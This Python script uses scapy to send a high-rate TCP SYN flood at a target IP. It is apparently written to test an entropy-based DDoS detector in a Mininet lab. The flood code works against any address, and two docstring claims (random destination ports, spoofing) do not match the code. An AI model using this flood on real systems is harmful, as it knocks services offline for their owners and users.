#!/usr/bin/env python3
"""
attack/syn_flood.py

Simple SYN flood generator for testing the entropy-based DDoS detector
in controller/ddos_controller.py, inside your own isolated Mininet lab.

Sends TCP SYN packets from a single spoofed-or-fixed source IP (this
host's own IP by default) to the target, at high rate, with random
source ports and a random destination port each time. This collapses
Shannon entropy of src_ip at the target/switch because (unlike normal
traffic which comes from many different hosts) all flood packets share
one dominant source IP.

Usage (run FROM the attacker host inside the Mininet CLI):
    mininet> h3 python3 attack/syn_flood.py 10.0.0.2
    mininet> h3 python3 attack/syn_flood.py 10.0.0.2 --duration 30 --rate 500

Requires scapy:
    pip install scapy --break-system-packages
"""
import argparse
import random
import time
import sys

try:
    from scapy.all import IP, TCP, send
except ImportError:
    print("scapy not found. Install it with:")
    print("  pip install scapy --break-system-packages")
    sys.exit(1)


def syn_flood(target_ip, target_port, duration, rate):
    """
    target_ip:   victim host's IP (e.g. 10.0.0.2)
    target_port: victim port to hit (default 80)
    duration:    how long to run, in seconds
    rate:        approx packets per second
    """
    print(f"[*] Starting SYN flood -> {target_ip}:{target_port} "
          f"for {duration}s at ~{rate} pkt/s")

    interval = 1.0 / rate if rate > 0 else 0
    end_time = time.time() + duration
    sent = 0

    while time.time() < end_time:
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")
        send(pkt, verbose=False)
        sent += 1

        if sent % 200 == 0:
            print(f"[*] {sent} SYN packets sent so far...")

        if interval > 0:
            time.sleep(interval)

    print(f"[*] Done. Total SYN packets sent: {sent}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN flood test tool for local Mininet lab")
    parser.add_argument("target_ip", help="Victim host IP, e.g. 10.0.0.2")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds (default: 30)")
    parser.add_argument("--rate", type=int, default=300, help="Packets per second (default: 300)")
    args = parser.parse_args()

    syn_flood(args.target_ip, args.port, args.duration, args.rate)
